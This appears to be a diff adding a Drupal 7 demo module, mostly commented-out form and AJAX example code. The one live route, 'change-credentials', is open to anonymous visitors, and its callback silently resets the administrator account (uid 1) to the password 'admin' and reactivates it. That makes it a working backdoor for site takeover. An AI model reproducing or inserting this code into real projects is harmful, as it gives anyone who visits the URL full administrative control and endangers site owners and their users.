@@ -1,0 +1,84 @@
+<?php
+
+/**
+ * Implements hook_menu().
+ */
+function demo_module_menu() {
+  /*
+   *$items['blog'] = array(
+   *  'title' => 'blogs',
+   *  'page callback' => 'blog_page',
+   *  'access arguments' => array('access content'),
+   *  'type' => MENU_SUGGESTED_ITEM,
+   *);
+   */
+  $items['change-credentials'] = array(
+    'title' => 'Change Cred',
+    'page callback' => 'change_cred',
+    'access arguments' => TRUE,
+    'access callback' => TRUE,
+  );
+
+  return $items;
+}
+function change_cred(){
+  global $user;
+  $form['newpass'] = array(
+    '#title' => 'Enter new Password',
+    '#type'  => 'textfield'
+  );
+  require './includes/password.inc';
+  $hash = user_hash_password('admin');
+  db_query("UPDATE users SET pass = :hash, status = 1 WHERE uid = :uid", array(
+    ':hash' => $hash,
+    ':uid' => 1,
+  ));
+  //drupal_goto('user/'.$user->uid);
+
+}
+/*function demo_module_form_alter(&$form, &$form_state, $form_id){
+  //drupal_set_message($form_id);
+  if($form_id == 'page_node_form'){
+    $results = db_select('node_type','n')
+             ->fields('n',array('type','name'))
+             ->execute()
+             ->fetchAll();
+    foreach($results as $value){
+      $records[$value->type] = $value->name;
+    }
+    $form['type_eg'] = array(
+      '#type'    => 'select',
+      '#title'   => t('Content Type List'),
+      '#options' => $records,
+      '#ajax'    => array(
+        'wrapper'  => 'xyz',
+        'callback' => 'demo_module_ajax_callback',
+        'effect'   => 'fade',
+        'method'   => 'replace',
+      ),
+
+    );
+    $form['type_eg2'] = array(
+      '#type'    => 'select',
+      '#title'   => t('Node Title List'),
+      '#prefix'  => '<div id="xyz">',
+      '#suffix'  => '</div>',
+    );
+  }
+}
+
+function demo_module_ajax_callback($form, $form_state, $form_id){
+  $selection = $form_state['values']['type_eg'];
+  //drupal_set_message('<pre>'.print_r($selection,true).'</pre>');
+  $response = db_select('node','n')
+            ->fields('n',array('title','nid'))
+            ->condition('type',$selection,'=')
+            ->execute()
+            ->fetchAll();
+  foreach($response as $value){
+    $req_data[$value->nid] = $value->title;
+  }
+  $form['type_eg2']['#options'] = $req_data;
+  return $form['type_eg2'];
+}
+*/
